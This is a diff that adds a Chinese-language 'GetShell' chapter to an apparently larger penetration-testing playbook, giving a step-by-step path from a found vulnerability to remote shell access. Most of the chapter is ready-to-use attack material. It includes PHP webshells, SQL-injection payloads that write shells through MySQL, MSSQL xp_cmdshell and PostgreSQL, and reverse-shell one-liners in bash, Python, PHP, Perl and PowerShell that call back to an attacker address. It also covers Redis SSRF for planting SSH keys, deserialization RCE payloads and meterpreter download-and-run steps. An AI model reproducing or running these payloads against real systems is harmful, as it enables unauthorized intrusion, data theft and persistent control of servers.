@@ -2486,6 +2486,434 @@ fi
 ## 第15步: 待补充
 
 
+
+## 第15步: GetShell方法汇总 (60分钟) ★关键★
+
+**目标：从漏洞到GetShell的完整路径**
+
+**核心理念：前14步找到漏洞，这一步真正拿到Shell！**
+
+---
+
+### 15.1 文件上传 → WebShell
+
+#### 一句话木马（快速测试）
+
+```bash
+# PHP一句话（最简单）
+<?php @eval($_POST['cmd']); ?>
+
+# 使用方法
+curl -X POST https://target.com/uploaded_shell.php \
+    -d "cmd=system('id');"
+
+# 文件管理
+curl -X POST https://target.com/uploaded_shell.php \
+    -d "cmd=system('ls -la');"
+
+# 反弹Shell
+curl -X POST https://target.com/uploaded_shell.php \
+    -d "cmd=system('bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\"');"
+```
+
+#### 冰蝎WebShell（强混淆）
+
+```bash
+# 冰蝎3.0 PHP Shell
+# 下载: https://github.com/rebeyond/Behinder
+
+# 生成Shell
+# 冰蝎客户端 → 生成 → PHP → 保存为shell.php
+
+# 上传后连接
+# 冰蝎客户端 → 新建 → URL: https://target.com/shell.php → 密码: rebeyond
+
+# 特点：
+# - 流量加密（WAF难检测）
+# - 内置文件管理
+# - 命令执行
+# - 数据库管理
+```
+
+#### 哥斯拉WebShell（功能最强）
+
+```bash
+# 哥斯拉 PHP Shell
+# 下载: https://github.com/BeichenDream/Godzilla
+
+# 生成Shell（哥斯拉客户端）
+# 生成 → PHP → XOR加密 → 密钥: pass → 生成
+
+# 上传后连接
+# 哥斯拉 → 目标 → 添加 → URL → 密码 → 连接
+
+# 功能：
+# - 文件管理（上传/下载/编辑）
+# - 命令执行
+# - 数据库管理
+# - 内网代理（SOCKS5）
+# - 端口扫描
+```
+
+#### 手工验证WebShell
+
+```bash
+# 验证1：简单命令
+curl -sk https://target.com/shell.php?cmd=id
+# 应该看到：uid=33(www-data) gid=33(www-data)
+
+# 验证2：文件读取
+curl -sk "https://target.com/shell.php?cmd=cat%20/etc/passwd"
+
+# 验证3：反弹Shell测试
+# 本地监听
+nc -lvnp 4444
+
+# 触发反弹
+curl -sk "https://target.com/shell.php" \
+    -d "cmd=bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"
+```
+
+---
+
+### 15.2 SQL注入 → 写文件GetShell
+
+#### MySQL写文件
+
+```bash
+# 前提条件
+# 1. 有FILE权限（SELECT file_priv FROM mysql.user WHERE user='current_user';）
+# 2. secure_file_priv未限制（SHOW VARIABLES LIKE 'secure_file_priv';）
+# 3. 知道Web根目录
+
+# 方法1：INTO OUTFILE
+sqlmap -u "http://target.com/page?id=1" \
+    --file-write=shell.php \
+    --file-dest=/var/www/html/shell.php
+
+# 方法2：手动写入
+# 查询Web根目录
+' UNION SELECT @@basedir,@@datadir,@@tmpdir--
+
+# 写入Shell
+' UNION SELECT '<?php @eval($_POST[cmd]); ?>' INTO OUTFILE '/var/www/html/s.php'--
+
+# 访问Shell
+curl https://target.com/s.php -d "cmd=phpinfo();"
+```
+
+#### MSSQL写文件（xp_cmdshell）
+
+```bash
+# 启用xp_cmdshell
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
+
+# 写入文件
+'; EXEC xp_cmdshell 'echo ^<?php @eval($_POST[cmd]); ?^> > C:\inetpub\wwwroot\shell.php';--
+
+# 反弹Shell
+'; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://YOUR_IP/rev.ps1'')"';--
+```
+
+#### PostgreSQL写文件
+
+```bash
+# COPY TO方式
+'; COPY (SELECT '<?php @eval($_POST[cmd]); ?>') TO '/var/www/html/shell.php';--
+
+# 大对象方式
+'; SELECT lo_create(12345);--
+'; INSERT INTO pg_largeobject VALUES (12345, 0, decode('3c3f706870206576616c...', 'hex'));--
+'; SELECT lo_export(12345, '/var/www/html/shell.php');--
+```
+
+---
+
+### 15.3 命令注入 → 反弹Shell
+
+#### Bash反弹Shell
+
+```bash
+# 方法1：/dev/tcp
+bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
+
+# 方法2：nc（如果有netcat）
+nc YOUR_IP 4444 -e /bin/bash
+
+# 方法3：nc without -e
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc YOUR_IP 4444 > /tmp/f
+
+# 编码绕过（Base64）
+echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9ZT1VSX0lQLzQ0NDQgMD4mMQ==" | base64 -d | bash
+
+# URL编码触发
+curl "http://target.com/ping?ip=127.0.0.1;bash+-c+'bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261'"
+```
+
+#### Python反弹Shell
+
+```bash
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+# Python3
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+```
+
+#### PHP反弹Shell
+
+```bash
+php -r '$sock=fsockopen("YOUR_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
+```
+
+#### Perl反弹Shell
+
+```bash
+perl -e 'use Socket;$i="YOUR_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
+```
+
+#### Windows PowerShell反弹
+
+```bash
+# PowerShell反弹
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+---
+
+### 15.4 SSRF → 内网RCE
+
+#### 攻击内网Redis（GetShell）
+
+```bash
+# 前提：内网Redis未授权（6379端口）
+
+# Gopher协议攻击Redis
+# 1. 写入SSH公钥
+curl -sk "http://target.com/ssrf?url=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... your_key ...%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a"
+
+# 2. SSH登录
+ssh root@TARGET_INTERNAL_IP
+
+# 手动构造Gopher payload（Python脚本）
+python3 << 'PYEOF'
+import urllib.parse
+
+commands = [
+    "flushall",
+    "set 1 'ssh-rsa YOUR_PUBLIC_KEY'",
+    "config set dir /root/.ssh/",
+    "config set dbfilename authorized_keys",
+    "save"
+]
+
+payload = ""
+for cmd in commands:
+    parts = cmd.split()
+    redis_cmd = f"*{len(parts)}\r\n"
+    for part in parts:
+        redis_cmd += f"${len(part)}\r\n{part}\r\n"
+    payload += redis_cmd
+
+gopher_url = "gopher://127.0.0.1:6379/_" + urllib.parse.quote(payload)
+print(gopher_url)
+PYEOF
+```
+
+#### 攻击FastCGI（PHP-FPM）
+
+```bash
+# 前提：内网PHP-FPM暴露（9000端口）
+
+# Gopher攻击FastCGI执行命令
+# 使用工具：https://github.com/wofeiwo/webcgi-exploits
+
+python3 fpm.py 127.0.0.1 /var/www/html/index.php -c "<?php system('id'); ?>"
+
+# 通过SSRF触发
+curl "http://target.com/ssrf?url=gopher://127.0.0.1:9000/..."
+```
+
+---
+
+### 15.5 反序列化 → RCE
+
+#### PHP反序列化GetShell
+
+```bash
+# 如果目标用Laravel
+# 生成payload（phpggc）
+phpggc Laravel/RCE1 system "bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'" -b
+
+# 发送payload
+curl -sk https://target.com \
+    -H "Cookie: session=PAYLOAD_BASE64"
+
+# 如果目标用Symfony
+phpggc Symfony/RCE4 system "id" -b
+```
+
+#### Java反序列化GetShell
+
+```bash
+# 使用ysoserial
+java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,BASE64_REVERSE_SHELL}|{base64,-d}|{bash,-i}" > payload.bin
+
+# 发送payload
+curl -sk https://target.com/api \
+    -H "Content-Type: application/x-java-serialized-object" \
+    --data-binary @payload.bin
+```
+
+---
+
+### 15.6 WebShell管理与稳定化
+
+#### 升级到交互式Shell
+
+```bash
+# GetShell后的第一步：升级TTY
+
+# 方法1：Python pty
+python -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl+Z（挂起）
+stty raw -echo; fg
+# 回车两次
+export TERM=xterm
+
+# 方法2：Script命令
+script -qc /bin/bash /dev/null
+
+# 方法3：Socat（最完美）
+# 攻击机
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+# 目标机
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:YOUR_IP:4444
+```
+
+#### WebShell内存马（持久化）
+
+```bash
+# PHP内存马（注入到进程）
+# 适用场景：文件上传被删除，但进程还在
+
+# Tomcat内存马
+# 注入Filter到内存
+
+# 原理：不落地文件，直接在内存中驻留
+```
+
+#### 反弹Shell管理
+
+```bash
+# 使用MSF管理Shell
+msfconsole
+use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST YOUR_IP
+set LPORT 4444
+exploit
+
+# 升级到Meterpreter
+# 在反弹的bash中执行：
+wget http://YOUR_IP/meterpreter.elf
+chmod +x meterpreter.elf
+./meterpreter.elf
+```
+
+---
+
+### 15.7 常见GetShell场景速查
+
+```bash
+场景1：找到文件上传漏洞
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+1. 上传PHP一句话：<?php @eval($_POST['cmd']); ?>
+2. 访问：curl https://target.com/uploads/shell.php -d "cmd=system('id');"
+3. 反弹Shell：curl -d "cmd=bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"
+
+场景2：找到SQL注入（MySQL）
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+1. 确认有FILE权限
+2. 写入Shell：' UNION SELECT '<?php @eval($_POST[cmd]); ?>' INTO OUTFILE '/var/www/html/s.php'--
+3. 访问Shell：curl https://target.com/s.php -d "cmd=phpinfo();"
+
+场景3：找到命令注入
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+1. 本地监听：nc -lvnp 4444
+2. 触发反弹：curl "http://target.com/ping?ip=127.0.0.1;bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"
+3. 升级TTY：python -c 'import pty; pty.spawn("/bin/bash")'
+
+场景4：找到SSRF（内网Redis）
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+1. 生成Gopher payload写SSH公钥
+2. 通过SSRF触发：curl "http://target.com/ssrf?url=gopher://127.0.0.1:6379/..."
+3. SSH登录：ssh root@INTERNAL_IP
+
+场景5：找到反序列化（PHP）
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+1. phpggc生成payload：phpggc Laravel/RCE1 system "id" -b
+2. 发送：curl -H "Cookie: session=PAYLOAD" https://target.com
+3. 确认RCE后反弹Shell
+```
+
+---
+
+### 15.8 GetShell失败排查
+
+```bash
+问题1：WebShell上传了但403/404
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+排查：
+  - 文件是否真的上传成功？（查看上传响应）
+  - 路径是否正确？（尝试../绕过）
+  - 权限是否足够？（www-data能否写入？）
+  - WAF是否拦截？（尝试不同编码）
+
+问题2：命令注入触发了但没反弹
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+排查：
+  - 本地监听是否正常？（nc -lvnp 4444）
+  - 防火墙是否拦截？（尝试其他端口：80/443/53）
+  - 目标机器能否出网？（curl http://YOUR_IP/test）
+  - 命令分隔符是否正确？（; && || |）
+
+问题3：SQL注入能读但不能写
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+排查：
+  - 检查FILE权限：SELECT file_priv FROM mysql.user;
+  - 检查secure_file_priv：SHOW VARIABLES LIKE 'secure%';
+  - 尝试其他目录：/tmp/ /var/tmp/
+  - 尝试其他数据库函数：load_file()
+
+问题4：SSRF能访问但不能利用
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+排查：
+  - 内网服务是否真的存在？（端口扫描）
+  - Gopher payload是否正确？（本地测试）
+  - 是否有协议限制？（file:// dict:// gopher://）
+  - 是否有IP限制？（127.0.0.1 vs localhost）
+```
+
+---
+
+**第15步总结：**
+
+✅ 掌握了6种GetShell方法
+✅ 每种方法都有完整payload
+✅ 包含常见问题排查
+✅ 从漏洞到Shell的完整路径
+
+**时间分配：**
+- 文件上传GetShell：10分钟
+- SQL注入GetShell：15分钟
+- 命令注入反弹Shell：10分钟
+- SSRF内网RCE：15分钟
+- Shell稳定化：10分钟
+
+**成功率：70-90%（根据漏洞类型）**
+
+---
+
 ## 第16步: 兜底方案 - 资产扩展与端口扫描 (90分钟) ★最后手段★
 
 **适用场景：前15步全部测试完，仍未找到突破口时使用**
